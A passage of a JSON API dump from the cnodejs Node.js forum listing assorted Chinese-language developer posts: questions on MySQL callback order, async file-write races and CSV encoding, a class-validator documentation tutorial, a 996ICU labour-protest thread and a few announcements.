href=\"https://www.fundebug.com/\">Fundebug</a>专注于JavaScript、微信小程序、微信小游戏、支付宝小程序、React Native、Node.js和Java线上应用实时BUG监控。 自从2016年双十一正式上线，Fundebug累计处理了10亿+错误事件，付费客户有Google、360、金山软件、百姓网等众多品牌企业。欢迎大家<a href=\"https://www.fundebug.com/team/create\">免费试用</a>！</p>\n<p><img src=\"https://static.fundebug.cn/wechat_slogan.png\" alt></p>\n<h3>版权声明</h3>\n<p>转载时请注明作者<a href=\"https://www.fundebug.com/\">Fundebug</a>以及本文地址：</p>\n<p><a href=\"https://blog.fundebug.com/2018/07/07/string-to-number/\">https://blog.fundebug.com/2018/07/07/string-to-number/</a></p>\n</div>","title":"JavaScript字符串转数字的5种方法及其陷阱","last_reply_at":"2019-04-11T02:21:44.297Z","good":false,"top":false,"reply_count":2,"visit_count":503,"create_at":"2019-04-04T02:35:47.403Z","author":{"loginname":"Fundebug","avatar_url":"https://avatars2.githubusercontent.com/u/26496557?v=4&s=120"}},{"id":"5cae9ffbdad66d658e407b4d","author_id":"5c90939f96558e26e1b66e84","tab":"ask","content":"<div class=\"markdown-text\"><p>在组件内写的路由钩子能不能获取数据之类的，或者是路由参数什么的</p>\n</div>","title":"关于vue-router","last_reply_at":"2019-04-11T02:16:47.419Z","good":false,"top":false,"reply_count":4,"visit_count":392,"create_at":"2019-04-11T02:01:31.776Z","author":{"loginname":"xuejiancnode","avatar_url":"https://avatars0.githubusercontent.com/u/48708465?v=4&s=120"}},{"id":"516e0ab46d382773067a5473","author_id":"50cbf5fb637ffa41556d22f2","content":"<div class=\"markdown-text\"><p>我要将用户查询的结果信息保存到csv或者execl（由于没有找到合适的execl库，所以采用csv库保存）中， 结果用execl打开csv文件发现乱码，通过google找到iconv-lite，可结果还是不行 。代码如下：\nfs.open(config.UP_PATH+’/csv/’+troopId+year+month+’.csv’,‘a’);\nvar csvData = ‘“序号”,“检查人”,“检查日期”,“省”,“城市”,“系统”,“售点”,“地址”,“门店类型”,’+shopnames;\nvar b = Iconv.encode(csvData,‘GBK’);\ncsv().from.string(b).to(config.UP_PATH+&quot;/csv/&quot;+troopId+year+month+’.csv’);</p>\n<p>shopnames：是一个中文字符串变量</p>\n</div>","title":"怎么解决数据保存到csv文件乱码问题","last_reply_at":"2019-04-10T14:28:16.858Z","good":false,"top":false,"reply_count":26,"visit_count":48520,"create_at":"2013-04-17T02:36:36.681Z","author":{"loginname":"zjshop","avatar_url":"//gravatar.com/avatar/9515c08503d6ee8bf1612e9bd8273f22?size=48"}},{"id":"5ca59ab231010b2dfbb4333e","author_id":"5ca1a9666c1de62dce4667d7","tab":"ask","content":"<div class=\"markdown-text\"><p>刚学习数据库的操作，向mysql发出申请后，会接着执行后面的代码，同时等待数据库的回调。\n那么如果发出多个请求，多个回调的执行顺序是啥样的呢？</p>\n<p>比如这样的代码</p>\n<blockquote>\n<p>var mysql  = require(‘mysql’);\nvar cnString = require(’…/sqlConnection.json’);\nvar connection = mysql.createConnection(cnString);\nconnection.connect();\nvar  userAddSql = ‘INSERT INTO node_user(id,name,age) VALUES(0,?,?)’;\nvar  userAddSql_Params = [&quot;张洒 ’ – &quot; , 55];\n//增 add\nconnection.query(userAddSql,userAddSql_Params,function (err, result) {\n//回调1\n});\nconnection.end();</p>\n</blockquote>\n<blockquote>\n<p>connection = mysql.createConnection(cnString);\nconnection.connect();\nvar  userAddSql = ‘INSERT INTO node_user(id,name,age) VALUES(0,?,?)’;\nvar  userAddSql_Params = [&quot;张洒 ’ – &quot; , 55];\n//增 add\nconnection.query(userAddSql,userAddSql_Params,function (err, result) {\n//回调2\n});\nconnection.end();</p>\n</blockquote>\n<blockquote>\n<p>connection = mysql.createConnection(cnString);\nconnection.connect();\nvar  userAddSql = ‘INSERT INTO node_user(id,name,age) VALUES(0,?,?)’;\nvar  userAddSql_Params = [&quot;张洒 ’ – &quot; , 55];\n//增 add\nconnection.query(userAddSql,userAddSql_Params,function (err, result) {\n//回调3\n});\nconnection.end();</p>\n</blockquote>\n<blockquote>\n<p>connection = mysql.createConnection(cnString);\nconnection.connect();\nvar  userAddSql = ‘INSERT INTO node_user(id,name,age) VALUES(0,?,?)’;\nvar  userAddSql_Params = [&quot;张洒 ’ – &quot; , 55];\n//增 add\nconnection.query(userAddSql,userAddSql_Params,function (err, result) {\n//回调4\n});\nconnection.end();</p>\n</blockquote>\n<p>预想的是，会按照回调1、2、3、4的顺序被执行，因为node是单线程的，回调函数应该按照申请的顺序被回调。\n但是实际运行几次后发现，每次四个回调的先后执行顺序完全不一样。\n哪个回调先回来都有可能，这是啥原因呢？</p>\n<p>怀疑问题出在mysql方面，但是不能确定。</p>\n<p>所以想问问大家。</p>\n</div>","title":"node + mysql 的回调的先后顺序问题？","last_reply_at":"2019-04-10T13:54:53.674Z","good":false,"top":false,"reply_count":8,"visit_count":642,"create_at":"2019-04-04T05:48:34.567Z","author":{"loginname":"jyk0011","avatar_url":"https://avatars0.githubusercontent.com/u/6062713?v=4&s=120"}},{"id":"5ca0d30b99e62a362ff41ad5","author_id":"57df88ff7d8293463a01e70b","tab":"share","content":"<div class=\"markdown-text\"><h4>上一贴被素质低下的人谩骂，建议cnodejs增加黑名单功能</h4>\n<h1>仓库地址 <a href=\"https://github.com/996icu/996.ICU\">https://github.com/996icu/996.ICU</a></h1>\n<p>996ICU最近的热门事件，因为比较敏感，都担心被企业拉入黑名单，在cnodejs居然只有我一个人敢发贴，我不入地狱谁入地狱，为了广大互联网从业人员，豁出去了，反正我也不打算能写程序到35岁\n工作 996，生病 ICU，说不定ICU的机会都没有，赚那么多钱有用吗？要敢于反抗，不畏强权，即使被生活所迫也不要放弃说“不”的权利，我们热爱工作，我们更热爱生活，我们要陪家人、我们要有时间去谈恋爱、去感受生命的美好\n<strong>程序猿的责任心不容质疑，我可以自愿007，但绝不愿强制996</strong></p>\n<h2>到2019/03/31 21:48，已经达到github star排行榜第四名，已经超过了linux、node、react等项目</h2>\n<p><img src=\"//static.cnodejs.org/Fre1-VOz_Q6R-QZbtifrX-M8Yjp8\" alt=\"QQ图片20190331214609.png\"></p>\n<h2>这些关注996工作制的程序员中，有程序员大牛吗？当然有！我们把粉丝数排名前10的程序员筛了出来。</h2>\n<p><img src=\"//static.cnodejs.org/FtUSgXzvDKwiS2zd78ME8j7bpAsH\" alt=\"0LcMty70Gl.jpeg\">\n排名第一的是一个熟悉的面孔，轮子哥！另外有来自腾讯的Coco，来自滴滴的singwhatiwanna，技术博主颜海镜等，这些人都在关注996。在39987个Star了该repos的程序员中，粉丝数大于1000的有47人，大于500的有110，大于100的有598人。说明还是有很多有影响力的程序员在关注996工作制。\n来源： <a href=\"https://www.yidianzixun.com/article/0LcMtyRT?title_sn=0\">https://www.yidianzixun.com/article/0LcMtyRT?title_sn=0</a></p>\n<p>各行各业都有被压榨，都有在反抗，比如富士康接二连三的跳楼，这些人用命换来了大量工厂的遵纪守法，在这个风口，十几万程序猿正在进行一项伟大的事业，为中国的程序猿们争取合法正当权益，让我们加油！</p>\n<p><strong>法律从来没说给钱多就允许违法，正义可能迟到但从不缺席</strong></p>\n<h2>请文明发表意见</h2>\n</div>","title":"重新开贴，讨论最近热门996ICU，工作 996，生病 ICU，说不定ICU的机会都没有，赚那么多钱有用吗？","last_reply_at":"2019-04-10T13:48:10.804Z","good":false,"top":false,"reply_count":15,"visit_count":1902,"create_at":"2019-03-31T14:47:39.933Z","author":{"loginname":"zengming00","avatar_url":"https://avatars2.githubusercontent.com/u/5255081?v=4&s=120"}},{"id":"5ca6cadf6c1de62dce4680c2","author_id":"5ca1a9666c1de62dce4667d7","tab":"ask","content":"<div class=\"markdown-text\"><p>要求：web服务，记录每次访问记录，保存到文本文件。\n测试目的：异步读写文件是否安全，多人访问下是否可以完整记录。</p>\n<p>代码，先写个最简单的代码进行测试。把每次访问的url记录下来。</p>\n<p>测试方法，在一个网页里使用多个iframe，模拟多人同时访问。</p>\n<blockquote>\n<p>var fs = require(‘fs’);\nvar http = require(“http”);\nhttp.createServer(function (request, response) {\nresponse.writeHeader(200, { “Content-Type”: “text/html” });\nresponse.write(“Hello World编码!&lt;br&gt;\\n”);\nresponse.write(&quot;&lt;br&gt; url:&quot;+request.url);</p>\n<pre class=\"prettyprint\"><code>if (request.url != &#x27;&#x2F;favicon.ico&#x27;){\n    fs.readFile(&#x27;.&#x2F;json.txt&#x27;, &#x27;utf8&#x27;, function(err, data){\n        console.log(data);\n        fs.writeFile(&#x27;.&#x2F;json.txt&#x27;,data +&#x27;\\r\\n&#x27;+ request.url ,function(err){\n            if(err) console.log(&#x27;写文件操作失败&#x27;);\n            else console.log(&#x27;写文件操作成功 &#x27; + request.url);\n        });\n    });\n}\n response.end();\n</code></pre><p>}).listen(8080);</p>\n</blockquote>\n<p>网页访问</p>\n<blockquote>\n<p>&lt;html lang=“en”&gt;\n&lt;head&gt;\n&lt;meta charset=“UTF-8”&gt;\n&lt;title&gt;Title&lt;/title&gt;\n&lt;/head&gt;\n&lt;body&gt;\n&lt;iframe src=“<a href=\"http://127.0.0.1:8080/1\">http://127.0.0.1:8080/1</a>”&gt;&lt;/iframe&gt;\n&lt;iframe src=“<a href=\"http://127.0.0.1:8080/22\">http://127.0.0.1:8080/22</a>”&gt;&lt;/iframe&gt;\n&lt;iframe src=“<a href=\"http://127.0.0.1:8080/333\">http://127.0.0.1:8080/333</a>”&gt;&lt;/iframe&gt;\n&lt;iframe src=“<a href=\"http://127.0.0.1:8080/4444\">http://127.0.0.1:8080/4444</a>”&gt;&lt;/iframe&gt;\n&lt;iframe src=“<a href=\"http://127.0.0.1:8080/55555\">http://127.0.0.1:8080/55555</a>”&gt;&lt;/iframe&gt;\n&lt;iframe src=“<a href=\"http://127.0.0.1:8080/666666\">http://127.0.0.1:8080/666666</a>”&gt;&lt;/iframe&gt;\n&lt;iframe src=“<a href=\"http://127.0.0.1:8080/7777777\">http://127.0.0.1:8080/7777777</a>”&gt;&lt;/iframe&gt;\n&lt;iframe src=“<a href=\"http://127.0.0.1:8080/88888888\">http://127.0.0.1:8080/88888888</a>”&gt;&lt;/iframe&gt;\n&lt;iframe src=“<a href=\"http://127.0.0.1:8080/999999999\">http://127.0.0.1:8080/999999999</a>”&gt;&lt;/iframe&gt;\n&lt;iframe src=“<a href=\"http://127.0.0.1:8080/aaaaaaaaaa\">http://127.0.0.1:8080/aaaaaaaaaa</a>”&gt;&lt;/iframe&gt;\n&lt;iframe src=“<a href=\"http://127.0.0.1:8080/bbbbbbbbbbb\">http://127.0.0.1:8080/bbbbbbbbbbb</a>”&gt;&lt;/iframe&gt;\n&lt;iframe src=“<a href=\"http://127.0.0.1:8080/cccccccccccc\">http://127.0.0.1:8080/cccccccccccc</a>”&gt;&lt;/iframe&gt;\n&lt;iframe src=“<a href=\"http://127.0.0.1:8080/ddddddddddddd\">http://127.0.0.1:8080/ddddddddddddd</a>”&gt;&lt;/iframe&gt;\n&lt;iframe src=“<a href=\"http://127.0.0.1:8080/eeeeeeeeeeeeee\">http://127.0.0.1:8080/eeeeeeeeeeeeee</a>”&gt;&lt;/iframe&gt;\n&lt;iframe src=“<a href=\"http://127.0.0.1:8080/fffffffffffffff\">http://127.0.0.1:8080/fffffffffffffff</a>”&gt;&lt;/iframe&gt;\n&lt;iframe src=“<a href=\"http://127.0.0.1:8080/gggggggggggggggg\">http://127.0.0.1:8080/gggggggggggggggg</a>”&gt;&lt;/iframe&gt;\n&lt;iframe src=“<a href=\"http://127.0.0.1:8080/hhhhhhhhhhhhhhhhhh\">http://127.0.0.1:8080/hhhhhhhhhhhhhhhhhh</a>”&gt;&lt;/iframe&gt;</p>\n<p>&lt;/body&gt;\n&lt;/html&gt;</p>\n</blockquote>\n<p>首先问问这种写法有没有什么致命问题，如果有的话，怎么改代码。</p>\n<p>这个代码有个小问题，没有事先判断文件是否存在，但是这个不是大事。</p>\n<p>测试方法，打开那个有很多iframe的网页，模拟多次访问，然后看看日志文件，然后刷新页面，再次看内容，重复多次。</p>\n<p>理想情况下，每次访问都会先读取文件内容，然后把url加在最后，在重新保存文件，这样每次访问都会被记录下来，不会有漏掉的。</p>\n<p>但是实际测试的时候却发现，不仅有漏掉的访问记录，而且还会把上一轮的内容覆盖掉。\n但是并不是每次都会把以前的记录覆盖掉。\n完全没发现任何规律。</p>\n<p>刷新两次网页后，日志文件是这个样子的</p>\n<blockquote>\n<p>/cccccccccccc\n/ddddddddddddd\n/eeeeeeeeeeeeee\n/fffffffffffffff\n/gggggggggggggggg\n/hhhhhhhhhhhhhhhhhh\n/1\n/333\n/55555\n/7777777\n/88888888\n/999999999\n/aaaaaaaaaa\n/bbbbbbbbbbb\n/cccccccccccc\n/ddddddddddddd\n/eeeeeeeeeeeeee\n/fffffffffffffff\n/gggggggggggggggg\n/hhhhhhhhhhhhhhhhhh</p>\n</blockquote>\n<p>再刷新网页，又变成这个样子</p>\n<blockquote>\n<p>/666666\n/aaaaaaaaaa\n/bbbbbbbbbbb\n/ddddddddddddd\n/eeeeeeeeeeeeee\n/fffffffffffffffg\n/hhhhhhhhhhhhhhhhhh\n/1\n/333\n/4444\n/55555\n/666666\n/7777777\n/88888888\n/aaaaaaaaaa\n/bbbbbbbbbbb\n/cccccccccccc\n/ddddddddddddd\n/fffffffffffffff\n/hhhhhhhhhhhhhhhhhh</p>\n</blockquote>\n<p>再刷新，简单了，就剩下六行了。</p>\n<blockquote>\n<p>/cccccccccccc\n/ddddddddddddd\n/eeeeeeeeeeeeee\n/fffffffffffffff\n/gggggggggggggggg\n/hhhhhhhhhhhhhhhhhh</p>\n</blockquote>\n<p>每次刷新网页后，日志文件的内容都不完整，而且没发现啥规律。</p>\n</div>","title":"异步读写文件的问题，是我写的代码有问题，还是出大事了？彻底蒙了。","last_reply_at":"2019-04-10T10:02:14.499Z","good":false,"top":false,"reply_count":12,"visit_count":681,"create_at":"2019-04-05T03:26:23.710Z","author":{"loginname":"jyk0011","avatar_url":"https://avatars0.githubusercontent.com/u/6062713?v=4&s=120"}},{"id":"582d121f6efc292b79ff09e2","author_id":"58219f2bd5e70f9005343462","tab":"ask","content":"<div class=\"markdown-text\"><p>一篇帖子阅读数如何获取？如何存储？\n求赐教</p>\n</div>","title":"一篇帖子的阅读数是怎么获得的？","last_reply_at":"2019-04-10T10:00:55.522Z","good":false,"top":false,"reply_count":16,"visit_count":2738,"create_at":"2016-11-17T02:12:47.267Z","author":{"loginname":"mengLLLL","avatar_url":"https://avatars1.githubusercontent.com/u/13366294?v=4&s=120"}},{"id":"5c9b430cfd41137eb7662787","author_id":"511350f6df9e9fcc58856443","tab":"share","content":"<div class=\"markdown-text\"><h2>前言</h2>\n<p>对每个接口的传入参数进行校验，是一个Web后端项目的必备功能，有一个npm包叫<a href=\"https://github.com/hapijs/joi\">Joi</a>可以很优雅的完成这个工作，比如这样子：</p>\n<pre class=\"prettyprint\"><code>const schema = {\n    userId: Joi.string()\n};\nconst {error, value} = Joi.validate({ userId: &#x27;a string&#x27; }, schema);\n</code></pre><p>我们使用Typescript是希望得到明确的类型定义，减少出错的可能性。在一个后端项目中，给每个接口定义它的传入参数结构以及返回结果的结构，是一件很值得做的事情，因为这样给后续的维护带来极大的便利。比如这样子：</p>\n<pre class=\"prettyprint\"><code>export type IFooParam = {\n  userId: string\n}\n\nexport type IFooResponse = {\n  name: string\n}\n\nasync foo (param: IFooParam): Promise&lt;IFooResponse&gt; {\n  &#x2F;&#x2F; Your business code\n  return {name: &#x27;bar&#x27;}\n}\n</code></pre><p>现在问题就来了，如果传入参数希望加多一个字段，我们必须得修改2个地方，一个是Joi的校验，一个是IFooParam类型的定义。有没有好的办法解决这个问题呢？</p>\n<h2>Class-validaotr</h2>\n<p>有一个npm包叫<a href=\"https://github.com/typestack/class-validator\">class-validator</a>, 是采用注解的方式进行校验，底层使用的是老牌的校验包<a href=\"https://github.com/chriso/validator.js\">validator.js</a>。<br>\n这次试用，发现通过一些小包装，居然做到像Joi一样优雅的写法，而且更好用！</p>\n<h3>定义传入/返回结构</h3>\n<pre class=\"prettyprint\"><code>import {Length, Min, Max} from &#x27;class-validator&#x27;\n\nexport class IRegister {\n  @Length(11)\n  phone: string\n\n  @Length(2, 10)\n  name: string\n\n  @Min(18)\n  @Max(50)\n  age: number\n}\n\nclass Button {\n  text: string\n}\n\nexport class ORegister {\n  &#x2F;**\n   * user&#x27;s id\n   *&#x2F;\n  userId: string\n\n  buttons: Button[]\n}\n</code></pre><p>这里定义了2个类，IRegister为传入参数，通过class-validator规定的注解方式做校验，ORegister为返回结果。</p>\n<p>class-validator官方提供的方式还不能直接对一个请求的body进行校验，它要求必须要是IRegister类的一个对象，所以需要做一些处理。</p>\n<h3>使用class-transformer做转化</h3>\n<p>跟class-validator的作者也开源了另外一个包，叫<a href=\"https://github.com/typestack/class-transformer\">class-transformer</a>, 可以将一个json转成指定的类的对象，官方的例子是这样的：</p>\n<pre class=\"prettyprint\"><code>import {plainToClass} from &quot;class-transformer&quot;;\n\nlet users = plainToClass(User, userJson); &#x2F;&#x2F; to convert user plain object a single user. also supports arrays\n</code></pre><p>利用这一点，我们写一个小工具：</p>\n<pre class=\"prettyprint\"><code>import * as classTransformer from &#x27;class-transformer&#x27;\nimport {validate} from &#x27;class-validator&#x27;\nimport * as lodash from &#x27;lodash&#x27;\n\nexport class ValidateUtil {\n  private static instance: ValidateUtil\n\n  private constructor () {\n  }\n\n  static getInstance () {\n    return this.instance || (this.instance = new ValidateUtil())\n  }\n\n  async validate (Clazz, data): Promise&lt;any&gt; {\n    const obj = classTransformer.plainToClass(Clazz, data)\n    const errors = await validate(obj)\n    if (errors.length &gt; 0) {\n      console.info(errors)\n      throw new Error(lodash.values(errors[0].constraints)[0])\n    }\n    return obj\n  }\n}\n</code></pre><p>这个小工具提供了一个validate方法，第一个参数是一个类定义，第二个是一个json，它先利用class-transformer将json转成指定类的对象，然后使用class-validator做校验，如果校验错误将抛出错误，否则返回转化后的对象。</p>\n<h3>在Controller中使用</h3>\n<p>有了上面的工具，就可以方便地在代码中对传入参数做校验了，比如这样：</p>\n<pre class=\"prettyprint\"><code>  static async register(ctx) {\n    const iRegister = await ValidateUtil.getInstance().validate(IRegister, ctx.request.body)\n    const oRegister = await UserService.register(iRegister)\n    ctx.body = oRegister\n  }\n</code></pre><h2>新问题</h2>\n<p>到了这里，完美地使用class-validator替换掉了Joi。</p>\n<p>但是还有一个问题没解决，也是之前一直遗留的问题。</p>\n<p>我们使用<a href=\"http://apidocjs.com/\">apidoc</a>编写接口文档，当新增或修改一个接口时，是通过编写一段注释，让apidoc自动生成html文档，将文档地址发给前端，可以减少双方的频繁沟通，而且对前端的体验也是非常好的。比如写这样一段注释：</p>\n<pre class=\"prettyprint\"><code>  &#x2F;**\n   * @api {post} &#x2F;user&#x2F;registerOld registerOld\n   * @apiGroup user\n   * @apiName registerOld\n   * @apiParam {String} name user&#x27;s name\n   * @apiParam {Number} age user&#x27;s age\n   * @apiSuccess {String} userId user&#x27;s id \n   *&#x2F;\n  router.post(&#x27;&#x2F;user&#x2F;registerOld&#x27;, UserController.register)\n</code></pre><p>apidoc会帮我们生成这样的文档： <a href=\"https://user-gold-cdn.xitu.io/2019/3/21/1699f85c7d18d3e3?w=1060&amp;h=916&amp;f=png&amp;s=88262\"><img src=\"https://user-gold-cdn.xitu.io/2019/3/21/1699f85c7d18d3e3?w=1060&amp;h=916&amp;f=png&amp;s=88262\" alt=\"oldApidocDemo\"></a></p>\n<p>问题比较明显，当我们要新增一个参数时，需要修改一次类的定义，同时还要修改一次apidoc的注释，很烦，由于很烦，文档会慢慢变得没人维护，新同事就会吐槽没有文档或者文档太旧了。</p>\n<p>理想的情况是代码即文档，只需要修改类的定义，apidoc文档自动更新。</p>\n<h2>探索apidoc根据class-validator的定义生成</h2>\n<p>从同事的分享中得知一个废弃的npm包，叫<a href=\"https://www.npmjs.com/package/apidoc-plugin-ts\">apidoc-plugin-ts</a>, 可以实现根据ts的interface定义来生成apidoc的。官方的例子：</p>\n<pre class=\"prettyprint\"><code>filename: .&#x2F;employers.ts\n \nexport interface Employer {\n  &#x2F;**\n   * Employer job title\n   *&#x2F;\n  jobTitle: string;\n  &#x2F;**\n   * Employer personal details\n   *&#x2F;\n  personalDetails: {\n    name: string;\n    age: number;\n  }\n}\n @apiInterface (.&#x2F;employers.ts) {Person}\n</code></pre><p>会转化成：</p>\n<pre class=\"prettyprint\"><code> @apiSuccess {String} jobTitle Job title\n @apiSuccess {Object} personalDetails Empoyer personal details\n @apiSuccess {String} personalDetails.name\n @apiSuccess {Number} personalDetails.age\n</code></pre><p>虽然不知道为什么作者要废弃它，但是它的思想很好，源码也很有帮助。</p>\n<p>给我的启发是，参考这个npm包，写一个针对class定义来生成apidoc的插件就行了。</p>\n<h2>造轮子: apidoc-plugin-class-validator</h2>\n<p>轮子的制造细节不适合在这里陈述，基本上参考apidoc-plugin-ts，目前已经发布在npm上了，<a href=\"https://www.npmjs.com/package/apidoc-plugin-class-validator\">apidoc-plugin-class-validator</a></p>\n<h2>使用apidoc-plugin-class-validator</h2>\n<p>以上面的注册接口为例，使用方法：</p>\n<pre class=\"prettyprint\"><code>  &#x2F;**\n   * @api {post} &#x2F;user&#x2F;register register\n   * @apiGroup user\n   * @apiName register\n   * @apiParamClass (src&#x2F;user&#x2F;io&#x2F;Register.ts) {IRegister}\n   * @apiSuccessClass (src&#x2F;user&#x2F;io&#x2F;Register.ts) {ORegister}\n   *&#x2F;\n  router.post(&#x27;&#x2F;user&#x2F;register&#x27;, UserController.register)\n</code></pre><p>就会生成文档： <a href=\"https://user-gold-cdn.xitu.io/2019/3/21/1699f85c40449b5a?w=1288&amp;h=1224&amp;f=png&amp;s=120386\"><img src=\"https://user-gold-cdn.xitu.io/2019/3/21/1699f85c40449b5a?w=1288&amp;h=1224&amp;f=png&amp;s=120386\" alt=\"demo\"></a></p>\n<p>后续新增字段，只需修改IRegister类的定义就行，真正做到了修改一处，处处生效，代码即文档的效果。</p>\n<p>本文的demo代码在<a href=\"https://github.com/zhengyhn/apidoc-plugin-class-validator-demo\">这里</a>，这是一个简单的web后端项目，看代码更容易理解。</p>\n<hr>\n<p>著作权归本文作者所有，未经授权，请勿转载，谢谢。</p>\n</div>","title":"使用class-validator替换Joi包的方法","last_reply_at":"2019-04-10T09:18:59.310Z","good":false,"top":false,"reply_count":2,"visit_count":523,"create_at":"2019-03-27T09:31:56.079Z","author":{"loginname":"kalengo","avatar_url":"https://avatars2.githubusercontent.com/u/8817810?v=4&s=120"}},{"id":"5caaf50ed68ff5064921af62","author_id":"57df88ff7d8293463a01e70b","tab":"share","content":"<div class=\"markdown-text\"><h1>事情是这样的：去年9月公司解散，个人原因瘫痪在床半年多，最近复习了下准备找工作，上了下猎聘网看看，我甚至都没登陆网站！！！没登陆网站！！！没登陆网站！！！</h1>\n<h1>下午以前公司的老板发消息给我，就是下面这位</h1>\n<p><img src=\"//static.cnodejs.org/FgvtDF0MwN99t6B8OOJOqD1B8QS6\" alt=\"QQ图片20190408150857.png\"></p>\n<h1>已举报</h1>\n<p><img src=\"//static.cnodejs.org/Fnkyp7h6C7c7QQ13qy1xCcVVgpI_\" alt=\"微信截图_20190408151015.png\"></p>\n<h1>鬼知道有没有用，只能说违法成本太低，维权成本太高</h1>\n</div>","title":"太可怕了，只要你浏览过招聘网站，公司HR就已经知道了","last_reply_at":"2019-04-10T04:01:15.678Z","good":false,"top":false,"reply_count":11,"visit_count":1792,"create_at":"2019-04-08T07:15:26.556Z","author":{"loginname":"zengming00","avatar_url":"https://avatars2.githubusercontent.com/u/5255081?v=4&s=120"}},{"id":"5c8b0c317ce0df3732428286","author_id":"5c10c50f7ec239239ff561c2","tab":"share","content":"<div class=\"markdown-text\"><p>这个 app “Mathway&quot; 挺强大的，\n你可以通过它特别优化过的键盘很方便地输入数学公式，或者直接拍照截取一个方程，\n尽管这个方程再复杂，这个 app 都可以马上告诉你 x 的解是多少，而且还有详细的解答步骤。</p>\n<p>感觉现在学习机器学习，这个 app 还挺能帮上忙的。\n这里有更详细的介绍：<a href=\"https://mergeek.com?project_id=MK5lYgAM7Zm1wx2k&amp;ref=cnode\">Mergeek: Mathway</a></p>\n<p><img src=\"//static.cnodejs.org/Fnqv5DnAcGdHFUu7Q70sQ4Ocn5ZG\" alt=\"392x696bb.jpg\"></p>\n</div>","title":"分享一个帮你解决数学问题的神器","last_reply_at":"2019-04-10T02:47:01.166Z","good":false,"top":false,"reply_count":2,"visit_count":871,"create_at":"2019-03-15T02:21:37.121Z","author":{"loginname":"Kilen","avatar_url":"https://avatars1.githubusercontent.com/u/2741628?v=4&s=120"}},{"id":"5cad5569d68ff5064921bc10","author_id":"5b39abe057137f22415c51eb","tab":"ask","content":"<div class=\"markdown-text\"><p>node要把腾讯云上服务器迁移到本地 之前一直用的gm的插件进行图片处理 现在迁移内网公司不给装各种预装环境没办法只能改用sharp\n据说sharp的性能也会很快，现在的问题是npm install 就各种报错  运行起来就是刚刚下面图片的错误 求大佬帮吗给看下问题?\n<img src=\"//static.cnodejs.org/Fr3cNMFE7QcqqsCAYkOktiNdaH8O\" alt=\"image.png\"></p>\n</div>","title":"node sharp 迁移服务器问题","last_reply_at":"2019-04-10T02:31:05.781Z","good":false,"top":false,"reply_count":0,"visit_count":519,"create_at":"2019-04-10T02:31:05.780Z","author":{"loginname":"nlbydcg","avatar_url":"https://avatars2.githubusercontent.com/u/40027034?v=4&s=120"}},{"id":"5cab1bdfd68ff5064921b0f3","author_id":"5cab188c7edd13064e05363f","tab":"share","content":"<div class=\"markdown-text\"><p>github设置好邮箱后\n<img src=\"//static.cnodejs.org/Fkv2NaFgTXwhAoJ9O93Nys4g0-R6\" alt=\"image.png\">\n点击通过github登陆，\n点击注册新账号，\n完毕，\n————————————————————————\n如果你这么操作还是登陆不上，欢迎去我的github留言，，我知道你想在这里留言也留言不到。。。。。。</p>\n<p>我登陆了（一年）才登陆上。。。。</p>\n<p>这个登陆操作很迷。。。。。</p>\n<p>我感觉应该加精。。。。。。。。</p>\n</div>","title":"终于成功登陆cnode，下面分享教程","last_reply_at":"2019-04-10T01:04:55.836Z","good":false,"top":false,"reply_count":5,"visit_count":773,"create_at":"2019-04-08T10:01:03.124Z","author":{"loginname":"ganshiqingyuan","avatar_url":"https://avatars0.githubusercontent.com/u/33950951?v=4&s=120"}},{"id":"5cac7ffbd68ff5064921b99a","author_id":"5c85d4b2acb681372d416dd6","tab":"share","content":"<div class=\"markdown-text\"><p>极客学院&amp;腾讯 TAPD —极客开放日活动，本次主题「敏捷开发畅想与实战」。</p>\n<p>多位行业大佬亲临：嘉宾包括中国 IT 界著名意见领袖、敏捷开发布道师熊节先生，源自硅谷、扎根香港的行业独角兽 Aftership CEO Teddy 「陈龙生」先生，腾讯 TAPD 敏捷事业群副总经理杨晓俊先生，极客学院&amp;Toppro 创始人姚尚朗先生。</p>\n<p>这回我们不吹虚的，我们着力探讨：1，哪些企业正在践行敏捷开发以及敏捷如何在真实场景中实现落地； 2，敏捷能否为企业、工程师带来双赢局面； 3，敏捷开发再实施过程中遇到的那些“坑”； 4，如何发挥工程师在“不确定”场景下的最大价值。</p>\n<p>4 月 13 日本周六下午 13：30，腾讯大厦（深南大道） 2 楼 2F 多功能厅，期待你的到来！</p>\n<p>通过链接来报名吧： <a href=\"https://www.huodongxing.com/event/2487232947800\">https://www.huodongxing.com/event/2487232947800</a></p>\n</div>","title":"极客学院&腾讯TAPD·极客开放日【敏捷开发畅想与实战】","last_reply_at":"2019-04-09T11:20:27.646Z","good":false,"top":false,"reply_count":0,"visit_count":586,"create_at":"2019-04-09T11:20:27.646Z","author":{"loginname":"wangxihua916","avatar_url":"https://avatars0.githubusercontent.com/u/37897167?v=4&s=120"}},{"id":"5c97586efd41137eb7660f7b","author_id":"58f837a3bbaf2f3f569be082","tab":"share","content":"<div class=\"markdown-text\"><blockquote>\n<p><strong>这是一个可以“伪造”微博、知乎、豆瓣、简书等网站界面截图的网站。但本网站是为了告诉（不懂编程的）普通人：不要轻易相信网上看到的“截图”！</strong></p>\n<p>项目地址：<a href=\"https://github.com/thegreatjavascript/FakeScreenshot\">https://github.com/thegreatjavascript/FakeScreenshot</a></p>\n<p>在线预览：<a href=\"https://fakes.netlify.com\">https://fakes.netlify.com</a></p>\n</blockquote>\n<p><img src=\"https://ww1.sinaimg.cn/large/007i4MEmgy1g1e1a8k7qdj30k00crglu.jpg\" alt=\"截图预览\"></p>\n<p><strong>当你在互联网上看到一张截图时，你第一反应是什么？</strong></p>\n<p>我曾在技术交流群里发了下面这么一张图，想看看人们的第一反应是什么。</p>\n<p><img src=\"https://ww1.sinaimg.cn/large/007i4MEmgy1g1bqlow4vhj30h20450t7.jpg\" alt=\"vue3.0\"></p>\n<p>“卧槽，这么快？”</p>\n<p>“正好这段时间没事做，学一下”</p>\n<p>“和2.0有什么区别啊？”</p>\n<p>“求你们别更了，我学不动了.jpg”</p>\n<p>“支持TS吗？”</p>\n<p>…</p>\n<p><strong>你看，没有人怀疑这个截图的真实性（当然，也可能有人怀疑但没发声）</strong></p>\n<p>我们都曾看到过各种截屏：包括不限于<code>知乎</code>、<code>微博</code>、<code>豆瓣</code>、<code>NGA</code>、<code>V2EX</code>、<code>QQ</code>、<code>微信</code> 